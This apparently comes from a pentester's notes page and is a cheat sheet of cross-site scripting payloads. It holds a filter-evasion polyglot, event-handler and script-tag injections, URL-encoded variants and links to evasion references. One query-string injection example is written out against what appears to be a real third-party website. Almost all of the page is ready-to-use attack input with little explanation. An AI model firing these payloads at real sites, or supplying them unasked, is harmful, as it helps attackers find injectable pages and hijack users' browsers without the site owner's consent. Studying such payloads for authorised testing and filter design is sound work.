# Payloads

An all in 1 XSS command

```
jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert()//>\x3e
```

Add this to a random url folder

```
/?ITG='"-->alert("ITG XSS")
e.g https://thymometrics.com/Styles/?nsextt=%27%22--%3E%3C/style%3E%3C/scRipt%3E%3CscRipt%3Ealert(%22ITG%20XSS%22)%3C/scRipt%3E
```

### Common working XSS payloads

```
onmouseover="prompt(1)">
<img src=x onerror=prompt(1);>
" onmouseover=prompt(971370) bad="
%3Cscript%3Ealert%2822%29%3C%2Fscript%3E&message=%3Cscript%3Ealert%2822%29%3C%2Fscript%3E
```

NETSPARKER - best tool other than burp

simple xss test for unsanatised html:

```
"><script>alert(/Xss/)</ScRIPT>
"><style><!-- </style> <img src=1 onerror=alert(xss)> 
"><svg/onload=alert(1)>  works on FF last version
```

### XSS cheat sheet

{% embed url="https://www.owasp.org/index.php/XSS_Filter_Evasion_Cheat_Sheet" %}

### payloads that work on any browser

{% embed url="http://html5sec.org" %}

<figure><img src="../../.gitbook/assets/Fif0VqHUoAAj7Kp.jfif" alt=""><figcaption></figcaption></figure>
